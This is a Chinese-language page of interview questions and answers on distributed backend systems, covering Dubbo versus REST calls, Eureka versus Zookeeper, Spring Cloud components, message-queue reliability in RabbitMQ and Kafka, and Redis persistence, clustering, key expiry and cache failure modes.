<h2 id="2-2-RPC与Rest的区别（dubbo协议和Feign远程调用的差异）"><a href="#2-2-RPC与Rest的区别（dubbo协议和Feign远程调用的差异）" class="headerlink" title="2.2.RPC与Rest的区别（dubbo协议和Feign远程调用的差异）"></a>2.2.RPC与Rest的区别（dubbo协议和Feign远程调用的差异）</h2><p>Dubbo协议默认采用的时RPC框架实现远程调用，而SpringCloud中使用的时基于Rest风格的调用方式。包括下面区别：</p>
<h3 id="1）Rest风格"><a href="#1）Rest风格" class="headerlink" title="1）Rest风格"></a>1）Rest风格</h3><p>REST是一种架构风格，指的是一组架构约束条件和原则。满足这些约束条件和原则的应用程序或设计就是 RESTful。</p>
<p>Rest的风格可以完全通过HTTP协议实现，使用 HTTP 协议处理数据通信。REST架构对资源的操作包括获取、创建、修改和删除资源的操作正好对应HTTP协议提供的GET、POST、PUT和DELETE方法。</p>
<p>因此请求和想要过程只要遵循http协议即可，更加灵活</p>
<p>SpringCloud中的Feign就是Rest风格的调用方式。</p>
<h3 id="2）RPC"><a href="#2）RPC" class="headerlink" title="2）RPC"></a>2）RPC</h3><p>Remote Procedure Call，远程过程调用，就是像调用本地方法一样调用远程方法。RPC架构图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142539.png" alt="img"></p>
<p>RPC一般要确定下面几件事情：</p>
<ul>
<li>数据传输方式：多数RPC框架选择TCP作为传输协议，性能比较好，也有部分框架选择http协议。</li>
<li>数据传输内容：请求方需要告知需要调用的函数的名称、参数、等信息。</li>
<li>序列化方式：客户端和服务端交互时将参数或结果转化为字节流在网络中传输，那么数据转化为字节流的或者将字节流转换成能读取的固定格式时就需要进行序列化和反序列化</li>
</ul>
<p>因为有序列化和反序列化的需求，因此对数据传输格式有严格要求，不如Http灵活</p>
<p>Dubbo协议就是RPC的典型代表。</p>
<p>我们看看Dubbo协议和Rest的调用区别：</p>
<table>
<thead>
<tr>
<th></th>
<th>Dubbo</th>
<th>Rest（Http调用）</th>
</tr>
</thead>
<tbody><tr>
<td>传输协议</td>
<td>TCP</td>
<td>TCP</td>
</tr>
<tr>
<td>开发语言</td>
<td>java</td>
<td>不限</td>
</tr>
<tr>
<td>性能</td>
<td>好</td>
<td>一般</td>
</tr>
<tr>
<td>灵活性</td>
<td>一般</td>
<td>好</td>
</tr>
</tbody></table>
<h2 id="2-3-Eureka和Zookeeper注册中心的区别"><a href="#2-3-Eureka和Zookeeper注册中心的区别" class="headerlink" title="2.3.Eureka和Zookeeper注册中心的区别"></a>2.3.Eureka和Zookeeper注册中心的区别</h2><p>答：</p>
<p>先看下CAP原则：C-数据一致性；A-服务可用性；P-服务对网络分区故障的容错性，这三个特性在任何分布式系统中不能同时满足，最多同时满足两个</p>
<ul>
<li>Eureka满足AP，Zookeeper满足CP<ul>
<li>Zookeeper满足一致性、容错性。数据要在各个服务间同步完成后才返回用户结果，而且如果服务出现网络波动，会立即从服务列表中剔除，服务不可使用</li>
<li>Eureka满足AP，可用性，容错性。当因网络故障时，Eureka的自我保护机制不会立即剔除服务，虽然用户获取到的服务不一定时可用的，但是至少能够获取到服务列表。用户访问服务列表时还可以利用重试机制，找到正确的服务。更符合分布式服务的高可用需求</li>
</ul>
</li>
<li>Eureka集群各节点平等，Zookeeper中有主从之分<ul>
<li>如果Zookeeper集群中部分宕机，可能会导致整个集群因为选主而阻塞，服务不可用</li>
<li>eureka集群宕机部分，不会对其它机器产生影响</li>
</ul>
</li>
<li>Eureka的服务发现需要主动去拉取，Zookeeper服务发现是监听机制<ul>
<li>eureka中获取服务列表后会缓存起来，每隔30秒重新拉取服务列表</li>
<li>zookeeper则是监听节点信息变化，当服务节点信息变化时，客户端立即就得到通知</li>
</ul>
</li>
</ul>
<h2 id="2-4-SpringCloud中的常用组件有哪些？"><a href="#2-4-SpringCloud中的常用组件有哪些？" class="headerlink" title="2.4.SpringCloud中的常用组件有哪些？"></a>2.4.SpringCloud中的常用组件有哪些？</h2><p>常见组件：</p>
<ul>
<li>SpringCloudNetflix：<ul>
<li>Eureka：注册中心，可以用Zookeeper和Consul代替</li>
<li>Ribbon：负载均衡器</li>
<li>Hystrix：断路器</li>
<li>Zuul：网关，可以用SpringCloudGateway代替</li>
</ul>
</li>
<li>SpringCloudBus：消息总线，默认基于RabbitMQ和Kafka实现</li>
<li>SpringCloudConfig：统一配置中心，分为server端和client端</li>
<li>SpringCloudStrean：数据流处理，默认基于RabbitMQ和Kafka</li>
<li>SpringCloudSleuth：结合SpringCloudZipkin实现链路追踪</li>
</ul>
<h1 id="3-RabbitMQ常见面试题"><a href="#3-RabbitMQ常见面试题" class="headerlink" title="3.RabbitMQ常见面试题"></a>3.RabbitMQ常见面试题</h1><h2 id="3-1-你们公司为什么选择了RabbitMQ产品，而不是RocketMQ和Kafka（问区别）？"><a href="#3-1-你们公司为什么选择了RabbitMQ产品，而不是RocketMQ和Kafka（问区别）？" class="headerlink" title="3.1.你们公司为什么选择了RabbitMQ产品，而不是RocketMQ和Kafka（问区别）？"></a>3.1.你们公司为什么选择了RabbitMQ产品，而不是RocketMQ和Kafka（问区别）？</h2><p>这个问题其实时问3种MQ的差别，先看一张图：</p>
<table>
<thead>
<tr>
<th>特性</th>
<th>RabbitMQ</th>
<th>RocketMQ</th>
<th>kafka</th>
</tr>
</thead>
<tbody><tr>
<td>开发语言</td>
<td>erlang</td>
<td>java</td>
<td>scala</td>
</tr>
<tr>
<td>单机吞吐量</td>
<td>万级</td>
<td>10万级</td>
<td>10万级</td>
</tr>
<tr>
<td>时效性</td>
<td>us级</td>
<td>ms级</td>
<td>ms级以内</td>
</tr>
<tr>
<td>可用性</td>
<td>高(主从架构)</td>
<td>非常高(分布式架构)</td>
<td>非常高(分布式架构)</td>
</tr>
<tr>
<td>功能特性</td>
<td>基于erlang开发，所以并发能力很强，性能极其好，延时很低;管理界面较丰富</td>
<td>MQ功能比较完备，扩展性佳</td>
<td>只支持主要的MQ功能，像一些消息查询，消息回溯等功能没有提供，毕竟是为大数据准备的，在大数据领域应用广。</td>
</tr>
</tbody></table>
<p>中小型软件公司，建议选RabbitMQ，原因：</p>
<ul>
<li>erlang语言天生具备高并发的特性，而且他的管理界面用起来十分方便。</li>
<li>RabbitMQ的社区十分活跃，可以解决开发过程中遇到的bug，这点对于中小型公司来说十分重要。</li>
<li>不考虑rocketmq和kafka的原因是，一方面中小型软件公司不如互联网公司，数据量没那么大，选消息中间件，应首选功能比较完备的，所以kafka排除。</li>
<li>不考虑rocketmq的原因是，rocketmq是阿里出品，如果阿里放弃维护rocketmq，中小型公司一般抽不出人来进行rocketmq的定制化开发，因此不推荐。</li>
</ul>
<p>RabbitMQ的缺点：</p>
<ul>
<li>虽然RabbitMQ是开源的，然而国内有几个能定制化开发erlang的程序员呢</li>
</ul>
<p>如果有大数据的需求，例如日志记录、程序运行链路追踪的记录，可以使用Kafka来做MQ，毕竟吞吐量比较大。</p>
<h2 id="3-2-在项目中哪些地方使用了MQ，解决了什么问题？"><a href="#3-2-在项目中哪些地方使用了MQ，解决了什么问题？" class="headerlink" title="3.2.在项目中哪些地方使用了MQ，解决了什么问题？"></a>3.2.在项目中哪些地方使用了MQ，解决了什么问题？</h2><p>这个问题主要问的时MQ的作用，包括下列几点： </p>
<ul>
<li><p>数据同步</p>
</li>
<li><p>解耦合</p>
</li>
<li><p>流量削峰</p>
</li>
<li><p>异步执行</p>
</li>
<li><p>延迟队列</p>
</li>
</ul>
<h3 id="1）解耦合"><a href="#1）解耦合" class="headerlink" title="1）解耦合"></a>1）解耦合</h3><p>例如项目中 商品微服务对商品完成了增删改，需要对索引库数据、商品的静态页做处理。但是不能在商品微服务嵌入代码，这样会出现耦合。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142541.png" alt="1574829165382"> </p>
<p>此时，可以利用MQ来解耦，让商品微服务发送消息通知，而相关的其它系统监听MQ即可：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142542.png" alt="1574829207585"> </p>
<h3 id="2）流量削峰"><a href="#2）流量削峰" class="headerlink" title="2）流量削峰"></a>2）流量削峰</h3><p>数据库的并发能力有限，往往称为业务执行的性能瓶颈。</p>
<p>例如我们的服务只能支持500的并发，然而又每秒1000甚至更高的服务流量涌入，服务肯定会崩溃的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142543.png" alt="1574829378276"> </p>
<p>此时，利用MQ来作为缓冲，就像大坝一样，高并发流量涌入，先放到MQ中缓存起来，后续系统再慢慢取出并处理即可：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142544.png" alt="1574829476538"> </p>
<h3 id="3）异步调用"><a href="#3）异步调用" class="headerlink" title="3）异步调用"></a>3）异步调用</h3><p>如果一个业务执行中，需要调用多个其它服务，业务链路很长，同步调用的用时就时多个服务执行的总耗时，如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142545.png" alt="1574829703693"> </p>
<p>但是，我们如果再B系统执行完成后，利用MQ通知系统C和系统D去完成，直接返回结果给用户，就可以减少业务耗时。这样就把同步阻塞调用，变成了异步调用：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142546.png" alt="1574829932259"> </p>
<h2 id="3-3-如何保证MQ的高可用"><a href="#3-3-如何保证MQ的高可用" class="headerlink" title="3.3.如何保证MQ的高可用"></a>3.3.如何保证MQ的高可用</h2><p>RabbitMQ底层时基于Erlang语言，对分布式支持较好。并且官方也给出了搭建镜像机器的方式，可以把队列及其中的数据同步到镜像节点中，当队列所在节点故障时，镜像队列可以继续提供服务。</p>
<p>另外，MQ数据可以持久化，当节点恢复时，可以恢复数据。</p>
<p>而Kafka和RocketMQ是通过主从集群方案来实现高可用的：</p>
<p>以rcoketMQ为例，他的集群就有多master 模式、多master多slave异步复制模式、多 master多slave同步双写模式。RocketMQ多master多slave模式部署架构图</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142547.png" alt="1574830176536"></p>
<p>kafka：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142548.png" alt="1574830129381"></p>
<h2 id="3-4-如何保证MQ的消息可靠性，防止消息丢失？"><a href="#3-4-如何保证MQ的消息可靠性，防止消息丢失？" class="headerlink" title="3.4.如何保证MQ的消息可靠性，防止消息丢失？"></a>3.4.如何保证MQ的消息可靠性，防止消息丢失？</h2><h3 id="1）RabbitMQ"><a href="#1）RabbitMQ" class="headerlink" title="1）RabbitMQ"></a>1）RabbitMQ</h3><p>消息丢失的几种情况：</p>
<ul>
<li>生产者发送消息时丢失：<ul>
<li>利用RabbitMQ提供的publisher confirm机制</li>
</ul>
</li>
<li>MQ丢失消息：<ul>
<li>消息持久化</li>
<li>镜像集群备份</li>
</ul>
</li>
<li>消费者丢失消息：rabbitmq中消息消费后自动删除，不会永久保留<ul>
<li>消费者的确认机制，在处理消息结束后，手动Acknowledge</li>
</ul>
</li>
</ul>
<h3 id="2）kafka"><a href="#2）kafka" class="headerlink" title="2）kafka"></a>2）kafka</h3><p>这里先引一张kafka Replication的<a href="http://www.infoq.com/cn/articles/kafka-analysis-part-2/">数据流向图</a><br><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142549.png" alt="image"><br>Producer在发布消息到某个Partition时，先通过ZooKeeper找到该Partition的Leader，然后无论该Topic的Replication Factor为多少（也即该Partition有多少个Replica），Producer只将该消息发送到该Partition的Leader。Leader会将该消息写入其本地Log。每个Follower都从Leader中pull数据。<br>针对上述情况，得出如下分析</p>
<ul>
<li><p>生产者丢数据<br>在kafka生产中，基本都有一个leader和多个follwer。follwer会去同步leader的信息。因此，为了避免生产者丢数据，做如下两点配置</p>
<ul>
<li>第一个配置要在producer端设置acks&#x3D;all。这个配置保证了，follwer同步完成后，才认为消息发送成功。</li>
<li>在producer端设置retries&#x3D;MAX，一旦写入失败，这无限重试</li>
</ul>
</li>
<li><p>消息队列丢数据<br>针对消息队列丢数据的情况，无外乎就是，数据还没同步，leader就挂了，这时zookpeer会将其他的follwer切换为leader,那数据就丢失了。针对这种情况，应该做两个配置。</p>
<ul>
<li>replication.factor参数，这个值必须大于1，即要求每个partition必须有至少2个副本</li>
<li>min.insync.replicas参数，这个值必须大于1，这个是要求一个leader至少感知到有至少一个follower还跟自己保持联系</li>
</ul>
<p>这两个配置加上上面生产者的配置联合起来用，基本可确保kafka不丢数据</p>
</li>
<li><p>消费者丢数据<br>这种情况一般是自动提交了offset，然后你处理程序过程中挂了。kafka以为你处理好了</p>
<ul>
<li>offset：指的是kafka的topic中的每个消费组消费的下标。简单的来说就是一条消息对应一个offset下标，每次消费数据的时候如果提交offset，那么下次消费就会从提交的offset加一那里开始消费。<br>比如一个topic中有100条数据，我消费了50条并且提交了，那么此时的kafka服务端记录提交的offset就是49(offset从0开始)，那么下次消费的时候offset就从50开始消费。</li>
<li>解决方案也很简单，改成手动提交即可。</li>
</ul>
</li>
</ul>
<h2 id="3-5-如何防止MQ消息的重复消费？"><a href="#3-5-如何防止MQ消息的重复消费？" class="headerlink" title="3.5.如何防止MQ消息的重复消费？"></a>3.5.如何防止MQ消息的重复消费？</h2><p>消息重复消费产生的原因：</p>
<ul>
<li>因为网络故障，导致生产者确认机制失败，生产者重发消息</li>
<li>因为网络故障，导致生产者确认机制失败，MQ重新投递消息</li>
</ul>
<p>解决思路：保证处理消息接口的幂等性：</p>
<ul>
<li>某些接口天生幂等，例如查询请求，无需处理</li>
<li>某些接口天生不幂等，比如新增，还有某些接口的修改功能<ul>
<li>能根据具体的业务或状态来确定的，在消费端通过业务判断是否执行过，例如新增订单，看看订单ID是否已经存在</li>
<li>对于无法通过业务判断的，我们可以为每一条消息设置全局唯一id，保存到数据库或其它地方。消息处理前对ID进行判断即可</li>
</ul>
</li>
</ul>
<h2 id="3-6-如何解决MQ的消息堆积问题？"><a href="#3-6-如何解决MQ的消息堆积问题？" class="headerlink" title="3.6.如何解决MQ的消息堆积问题？"></a>3.6.如何解决MQ的消息堆积问题？</h2><p>通过同一个队列多消费者监听，实现消息的争抢，加快消息消费速度。</p>
<h2 id="3-7-如何保证MQ消息的有序性？"><a href="#3-7-如何保证MQ消息的有序性？" class="headerlink" title="3.7.如何保证MQ消息的有序性？"></a>3.7.如何保证MQ消息的有序性？</h2><p>某个业务发出了3条消息，要求这3条消息按照发送时的顺序执行。</p>
<ul>
<li>业务同时对并发要求不高：<ul>
<li>保证消息发送时有序同步发送</li>
<li>保证消息发送被同一个队列接收</li>
<li>保证一个队列只有一个消费者</li>
</ul>
</li>
<li>业务同时对并发要求较高：<ul>
<li>满足上述第一个场景的条件</li>
<li>可以有多个队列</li>
<li>有时序要求的一组消息，通过hash方式分派到一个固定队列</li>
</ul>
</li>
</ul>
<h1 id="4-Redis相关问题"><a href="#4-Redis相关问题" class="headerlink" title="4.Redis相关问题"></a>4.Redis相关问题</h1><h2 id="4-1-Redis与Memcache的区别？"><a href="#4-1-Redis与Memcache的区别？" class="headerlink" title="4.1.Redis与Memcache的区别？"></a>4.1.Redis与Memcache的区别？</h2><ul>
<li><code>redis支持更丰富的数据类型</code>（支持更复杂的应用场景）：Redis不仅仅支持简单的k&#x2F;v类型的数据，同时还提供list，set，zset，hash等数据结构的存储。memcache支持简单的数据类型，String。</li>
<li><code>Redis支持数据的持久化</code>，可以将内存中的数据保持在磁盘中，重启的时候可以再次加载进行使用,而Memecache把数据全部存在内存之中。</li>
<li><code>集群模式</code>：memcached没有原生的集群模式，需要依靠客户端来实现往集群中分片写入数据；但是 redis 目前是原生支持 cluster 模式的.</li>
<li><code>Redis使用单线程</code>：Memcached是多线程，非阻塞IO复用的网络模型；Redis使用单线程的多路 IO 复用模型。</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142550.png" alt="1574821356723"></p>
<h2 id="4-2-Redis的持久化方案由哪些？"><a href="#4-2-Redis的持久化方案由哪些？" class="headerlink" title="4.2.Redis的持久化方案由哪些？"></a>4.2.Redis的持久化方案由哪些？</h2><p>Redis主要提供了两种持久化机制，RDB和AOF:</p>
<h3 id="1）RDB："><a href="#1）RDB：" class="headerlink" title="1）RDB："></a>1）RDB：</h3><p>默认开启，满足条件时将内存中的数据快照到磁盘中，创建一个dump.rdb文件，Redis启动时再恢复到内存中。</p>
<p>Redis会单独创建fork()一个子进程，将当前父进程的数据库数据复制到子进程的内存中，然后由子进程写入到临时文件中，持久化的过程结束了，再用这个临时文件替换上次的快照文件，然后子进程退出，内存释放。</p>
<p>需要注意的是，每次快照持久化都会将主进程的数据库数据复制一遍，导致内存开销加倍，若此时内存不足，则会阻塞服务器运行，直到复制结束释放内存；都会将内存数据完整写入磁盘一次，所以如果数据量大的话，而且写操作频繁，必然会引起大量的磁盘I&#x2F;O操作，严重影响性能，并且最后一次持久化后的数据可能会丢失；</p>
<p>RDB策略配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">save 900 1    #在900秒(15分钟)之后，如果至少有1个key发生变化，Redis就会自动触发BGSAVE命令创建快照。</span><br><span class="line"></span><br><span class="line">save 300 10   #在300秒(5分钟)之后，如果至少有10个key发生变化，Redis就会自动触发BGSAVE命令创建快照。</span><br><span class="line"></span><br><span class="line">save 60 10000 #在60秒(1分钟)之后，如果至少有10000个key发生变化，Redis就会自动触发BGSAVE命令创建快照。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2）AOF"><a href="#2）AOF" class="headerlink" title="2）AOF:"></a>2）AOF:</h3><p>与快照持久化相比，AOF持久化 的实时性更好，因此已成为主流的持久化方案。默认情况下Redis没有开启AOF（append only file）方式的持久化，可以通过appendonly参数开启：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">appendonly yes</span><br></pre></td></tr></table></figure>

<p>开启AOF持久化后每执行一条会更改Redis中的数据的命令，Redis就会将该命令写入硬盘中的AOF文件。AOF文件的保存位置和RDB文件的位置相同，都是通过dir参数设置的，默认的文件名是appendonly.aof。</p>
<p>在Redis的配置文件中存在三种不同的 AOF 持久化方式，它们分别是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">appendfsync always     <span class="comment">#每次有数据修改发生时都会写入AOF文件,这样会严重降低Redis的速度</span></span><br><span class="line">appendfsync everysec  <span class="comment">#每秒钟同步一次，显示地将多个写命令同步到硬盘</span></span><br><span class="line">appendfsync no      <span class="comment">#让操作系统决定何时进行同步</span></span><br></pre></td></tr></table></figure>

<p>为了兼顾数据和写入性能，用户可以考虑 appendfsync everysec选项 ，让Redis每秒同步一次AOF文件，Redis性能几乎没受到任何影响。而且这样即使出现系统崩溃，用户最多只会丢失一秒之内产生的数据。当硬盘忙于执行写入操作的时候，Redis还会优雅的放慢自己的速度以便适应硬盘的最大写入速度。</p>
<h2 id="4-3-Redis的集群方式有哪些？"><a href="#4-3-Redis的集群方式有哪些？" class="headerlink" title="4.3.Redis的集群方式有哪些？"></a>4.3.Redis的集群方式有哪些？</h2><h3 id="1）主从集群"><a href="#1）主从集群" class="headerlink" title="1）主从集群"></a>1）主从集群</h3><p>主从集群，也是读写分离集群。一般都是一主多从方式。</p>
<p>Redis 的复制（replication）功能允许用户根据一个 Redis 服务器来创建任意多个该服务器的复制品，其中被复制的服务器为主服务器（master），而通过复制创建出来的服务器复制品则为从服务器（slave）。</p>
<p>只要主从服务器之间的网络连接正常，主从服务器两者会具有相同的数据，主服务器就会一直将发生在自己身上的数据更新同步 给从服务器，从而一直保证主从服务器的数据相同。</p>
<ul>
<li>写数据时只能通过主节点完成</li>
<li>读数据可以从任何节点完成</li>
<li>如果配置了<code>哨兵节点</code>，当master宕机时，哨兵会从salve节点选出一个新的主。</li>
</ul>
<p>主从集群分两种：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142551.png" alt="1574821993599"> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142552.png" alt="1574822026037"> </p>
<p>带有哨兵的集群：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142553.png" alt="1574822077190"></p>
<h3 id="2）分片集群"><a href="#2）分片集群" class="headerlink" title="2）分片集群"></a>2）分片集群</h3><p>主从集群中，每个节点都要保存所有信息，容易形成木桶效应。并且当数据量较大时，单个机器无法满足需求。此时我们就要使用分片集群了。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142554.png" alt="1574822184467"> </p>
<p>集群特征：</p>
<ul>
<li><p>每个节点都保存不同数据</p>
</li>
<li><p>所有的redis节点彼此互联(PING-PONG机制),内部使用二进制协议优化传输速度和带宽.</p>
</li>
<li><p>节点的fail是通过集群中超过半数的节点检测失效时才生效.</p>
</li>
<li><p>客户端与redis节点直连,不需要中间proxy层连接集群中任何一个可用节点都可以访问到数据</p>
</li>
<li><p>redis-cluster把所有的物理节点映射到[0-16383]slot（插槽）上，实现动态伸缩</p>
</li>
</ul>
<p>为了保证Redis中每个节点的高可用，我们还可以给每个节点创建replication（slave节点），如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142555.png" alt="1574822584357"></p>
<p>出现故障时，主从可以及时切换：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142556.png" alt="1574822602109"></p>
<h2 id="4-4-Redis的分片集群如何做到集群动态伸缩（hash槽原理）"><a href="#4-4-Redis的分片集群如何做到集群动态伸缩（hash槽原理）" class="headerlink" title="4.4.Redis的分片集群如何做到集群动态伸缩（hash槽原理）"></a>4.4.Redis的分片集群如何做到集群动态伸缩（hash槽原理）</h2><p>创建集群时，Redis会将16384个插槽分配到不同的节点上。</p>
<p>redis集群存储数据时，会根据key计算插槽值，利用key的<code>有效部分</code>使用CRC16算法计算出哈希值，再将哈希值对16384取余，得到插槽值。</p>
<p><strong>插槽在哪个节点，数据就跟随到哪个几点，因此数据时跟插槽绑定，而不是具体的机器</strong>。</p>
<p>当集群中有新的机器加入，我们可以重新分配插槽，Redis会自动把对应插槽的数据同步到新的节点。</p>
<h2 id="4-5-Redis的常用数据类型有哪些？"><a href="#4-5-Redis的常用数据类型有哪些？" class="headerlink" title="4.5.Redis的常用数据类型有哪些？"></a>4.5.Redis的常用数据类型有哪些？</h2><p>支持多种类型的数据结构，主要区别是value存储的数据格式不同：</p>
<ul>
<li><p>string：最基本的数据类型，二进制安全的字符串，最大512M。</p>
</li>
<li><p>list：按照添加顺序保持顺序的字符串列表。</p>
</li>
<li><p>set：无序的字符串集合，不存在重复的元素。</p>
</li>
<li><p>sorted set：已排序的字符串集合。</p>
</li>
<li><p>hash：key-value对格式</p>
</li>
</ul>
<h2 id="4-6-Redis是单线程，为什么并发能力这么强"><a href="#4-6-Redis是单线程，为什么并发能力这么强" class="headerlink" title="4.6.Redis是单线程，为什么并发能力这么强?"></a>4.6.Redis是单线程，为什么并发能力这么强?</h2><p>答：</p>
<p>单线程可以带来下列好处：</p>
<p>1）绝大部分请求是纯粹的内存操作（非常快速）</p>
<p>2）采用单线程,避免了不必要的上下文切换和竞争条件</p>
<p>3）采用非阻塞IO，利用了IO多路复用的特性。</p>
<p>简述IO多路复用的模型：</p>
<p>首先，Redis线程模型包括下面几个概念：</p>
<ul>
<li>套接字（Socket)：用户请求套接字对象</li>
<li>I&#x2F;O 多路复用程序：监听客户端Socket，并未客户端绑定事件处理器</li>
<li>文件事件分派器（dispatcher）：根据客户端目前状态不同，分发不同的事件处理器处理</li>
<li>事件处理器：处理用户具体操作事件，包括：接收套接字（accept）、读取（read）、写入（write）、关闭（close）等操作的处理器</li>
</ul>
<p>如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142557.png" alt="1574819020635"></p>
<h2 id="4-7-聊一下Redis事务机制"><a href="#4-7-聊一下Redis事务机制" class="headerlink" title="4.7.聊一下Redis事务机制"></a>4.7.聊一下Redis事务机制</h2><p>Redis事务功能是通过MULTI、EXEC、DISCARD和WATCH 四个原语实现的。Redis会将一个事务中的所有命令序列化，然后按顺序执行。但是Redis事务不支持回滚操作，命令运行出错后，正确的命令会继续执行。</p>
<ul>
<li><code>MULTI</code>: 用于开启一个事务，它总是返回OK。 MULTI执行之后，客户端可以继续向服务器发送任意多条命令，这些命令不会立即被执行，而是被放到一个队列中</li>
<li><code>EXEC</code>：执行所有事务块内的命令。返回事务块内所有命令的返回值，按命令执行的先后顺序排列。 当操作被打断时，返回空值 nil </li>
<li><code>DISCARD</code>：清空事务队列，并放弃执行事务， 并且客户端会从事务状态中退出</li>
<li>WATCH：Redis的乐观锁机制，利用compare-and-set（CAS）原理，可以监控一个或多个键，一旦其中有一个键被修改（或删除），之后的事务就不会执行</li>
</ul>
<h2 id="4-8-Redis的Key过期策略"><a href="#4-8-Redis的Key过期策略" class="headerlink" title="4.8.Redis的Key过期策略"></a>4.8.Redis的Key过期策略</h2><p>Redis是内存存储，如果key永不过期，就会导致内存占用越来越多，因此会采用：定期删除、惰性删除结合内存的淘汰机制来清理内存。</p>
<ul>
<li>定期删除：redis默认每隔100ms检查，是否有过期的key,有过期key则删除。需要说明的是，redis不是每个100ms将所有的key检查一次，而是随机抽取进行检查，因为如果对全部key检查，会占用过多资源。因此，没有抽查到的key就不会删除，这样内存占用依然会越来越多</li>
<li>惰性删除：当获取某个key的时候，redis会检查一下key是否有过期时间，是否已经过期，如果过期就会删除</li>
</ul>
<p>但是依据上面的两种策略，依然会有漏网之鱼（比如过期了，一直没有被抽查到，也没有人访问的key)，这样内存也会耗尽。</p>
<p>因此当redis内存不足时，会采用淘汰机制，删除一些Key，包括下面的策略：</p>
<ul>
<li>volatile-lru：从已设置过期时间的数据集（server.db[i].expires）中挑选最近最少使用的数据淘汰</li>
<li>volatile-ttl：从已设置过期时间的数据集（server.db[i].expires）中挑选将要过期的数据淘汰</li>
<li>volatile-random：从已设置过期时间的数据集（server.db[i].expires）中任意选择数据淘汰</li>
<li>allkeys-lru：从数据集（server.db[i].dict）中挑选最近最少使用的数据淘汰</li>
<li>allkeys-random：从数据集（server.db[i].dict）中任意选择数据淘汰</li>
<li>no-enviction：禁止驱逐数据，新写入操作会报错</li>
</ul>
<p>注意：如果没有设置 过期时间的key, 并且淘汰机制是volatile-lru, volatile-random 和 volatile-ttl 中的一个，那么就无法实现淘汰，与no-eviction基本上一致。</p>
<h2 id="4-9-Redis在项目中的哪些地方有用到，解决什么问题？"><a href="#4-9-Redis在项目中的哪些地方有用到，解决什么问题？" class="headerlink" title="4.9.Redis在项目中的哪些地方有用到，解决什么问题？"></a>4.9.Redis在项目中的哪些地方有用到，解决什么问题？</h2><p>（1）共享session</p>
<p>在分布式系统下，服务会部署在不同的tomcat，因此多个tomcat的session无法共享，以前存储在session中的数据无法实现共享，可以用redis代替session，解决分布式系统间数据共享问题。</p>
<p>（2）数据缓存</p>
<p>Redis采用内存存储，读写效率较高。我们可以把数据库的访问频率高的热点数据存储到redis中，这样用户请求时优先从redis中读取，减少数据库压力，提高并发能力。</p>
<p>（3）异步队列</p>
<p>Reids在内存存储引擎领域的一大优点是提供 list 和 set 操作，这使得Redis能作为一个很好的消息队列平台来使用。而且Redis中还有pub&#x2F;sub这样的专用结构，用于1对N的消息通信模式。</p>
<p>（4）排行榜&#x2F;计数器</p>
<p>Redis在内存中对数字进行递增或递减的操作实现的非常好。集合（Set）和有序集合（Sorted Set）也使得我们在执行这些操作的时候变的非常简单，Redis只是正好提供了这两种数据结构。</p>
<p>（5）分布式锁</p>
<p>Redis中的乐观锁机制，可以帮助我们实现分布式锁的效果，用于解决分布式系统下的多线程安全问题</p>
<h2 id="4-10-Redis的缓存击穿（热点Key问题）、缓存雪崩、缓存穿透问题及解决方案"><a href="#4-10-Redis的缓存击穿（热点Key问题）、缓存雪崩、缓存穿透问题及解决方案" class="headerlink" title="4.10.Redis的缓存击穿（热点Key问题）、缓存雪崩、缓存穿透问题及解决方案"></a>4.10.Redis的缓存击穿（热点Key问题）、缓存雪崩、缓存穿透问题及解决方案</h2><h3 id="1）缓存穿透"><a href="#1）缓存穿透" class="headerlink" title="1）缓存穿透"></a>1）缓存穿透</h3><p>一般的缓存系统，都是按照key去缓存查询，如果不存在对应的value，就应该去后端系统查找（比如DB）。一些恶意的请求会故意查询不存在的key,请求量很大，就会对后端系统造成很大的压力。这就叫做缓存穿透。</p>
<p>如何避免？</p>
<ul>
<li>对查询结果为空的情况也进行缓存，缓存时间设置短一点，或者该key对应的数据insert了之后重置缓存。</li>
<li>利用布隆过滤器，对不存在的key进行判断过滤。</li>
</ul>
<h3 id="2）缓存雪崩"><a href="#2）缓存雪崩" class="headerlink" title="2）缓存雪崩"></a>2）缓存雪崩</h3><p>缓存雪崩，是指在某一个时间段，缓存集中过期失效。对这批数据的访问查询，都落到了数据库上，对于数据库而言，就会产生周期性的压力波峰。</p>
<p>解决方案：</p>
<ul>
<li>数据分类分批处理：采取不同分类数据，缓存不同周期</li>
<li>热点数据缓存时间长一些，冷门数据缓存时间短一些</li>
<li>避免redis节点宕机引起雪崩，搭建主从集群，保证高可用</li>
</ul>
